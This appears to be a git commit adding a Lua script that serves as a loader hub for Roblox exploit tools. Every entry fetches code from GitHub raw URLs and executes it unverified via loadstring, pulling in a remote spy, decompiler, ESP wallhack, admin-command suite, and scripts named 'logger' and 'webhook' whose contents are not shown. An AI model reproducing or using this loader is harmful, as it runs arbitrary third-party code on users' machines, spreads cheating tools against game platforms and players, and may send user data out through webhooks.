941acc14725a57f3b5c58dc8e8e971cf77d0b792
FrotntEvill <kaidmHub@gmail.com>
2026-08-10 19:08:04 +0300

    Create main.lua

---
+++ scripts/main.lua
@@ -0,0 +1,12 @@
+local rwa = {
+  respy = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/caomod2077/Script/refs/heads/main/RemoteSpy-V2.lua.txt"))() end,
+  dexpp = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/jodta/my-scripts/refs/heads/main/Dex%2B%2B/Decompiler%20Fix.lua"))() end,
+  asset = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/Front-Evill/NewScriptRoblox/refs/heads/main/free/logger.lua'))()end,
+  unesp = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ic3w0lf22/Unnamed-ESP/master/UnnamedESP.lua"))() end,
+  Yield = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end,
+  logwh = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/Front-Evill/devlyx/refs/heads/main/webhook.luau'))() end,
+  stcmd = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Front-Evill/NewScriptRoblox/refs/heads/main/Devlyx/main.luau"))() end,
+  respy2= function() loadstring(game:HttpGet('https://raw.githubusercontent.com/Front-Evill/devlyx/refs/heads/main/RemoteSpy.lua'))() end,
+  dxesp = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/Front-Evill/devlyx/refs/heads/main/esp.lua'))() end,
+  emote = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/7yd7/Hub/refs/heads/Branch/GUIS/Emotes.lua"))() end,
+}
